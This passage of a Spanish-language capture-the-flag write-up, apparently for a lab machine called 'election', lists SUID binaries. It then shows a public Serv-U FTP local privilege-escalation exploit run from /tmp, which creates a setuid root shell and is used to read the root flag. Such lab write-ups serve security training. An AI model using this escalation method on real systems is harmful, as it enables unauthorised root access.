/snap/core/7270/usr/bin/sudo
/snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/7270/usr/lib/openssh/ssh-keysign
/snap/core/7270/usr/lib/snapd/snap-confine
/snap/core/7270/usr/sbin/pppd
/snap/core18/1066/bin/mount
/snap/core18/1066/bin/ping
/snap/core18/1066/bin/su
/snap/core18/1066/bin/umount
/snap/core18/1066/usr/bin/chfn
/snap/core18/1066/usr/bin/chsh
/snap/core18/1066/usr/bin/gpasswd
/snap/core18/1066/usr/bin/newgrp
/snap/core18/1066/usr/bin/passwd
/snap/core18/1066/usr/bin/sudo
/snap/core18/1066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1066/usr/lib/openssh/ssh-keysign
/snap/core18/1223/bin/mount
/snap/core18/1223/bin/ping
/snap/core18/1223/bin/su
/snap/core18/1223/bin/umount
/snap/core18/1223/usr/bin/chfn
/snap/core18/1223/usr/bin/chsh
/snap/core18/1223/usr/bin/gpasswd
/snap/core18/1223/usr/bin/newgrp
/snap/core18/1223/usr/bin/passwd
/snap/core18/1223/usr/bin/sudo
/snap/core18/1223/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1223/usr/lib/openssh/ssh-keysign
```

## Escalada de privilegios con exploit del servicio Serv-U

[Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (2)](https://www.exploit-db.com/exploits/47173) 

```bash
love@election:/tmp$ bash exploit.sh 
[*] Launching Serv-U ...
sh: 1: : Permission denied
[+] Success:
-rwsr-xr-x 1 root root 1113504 Oct 14 23:10 /tmp/sh
[*] Launching root shell: /tmp/sh
sh-4.4# whoami
root
```

## Flag del usuario root 

```bash
sh-4.4# cd root/
sh-4.4# ls
root.txt
sh-4.4# cat root.txt
523*****************************
```

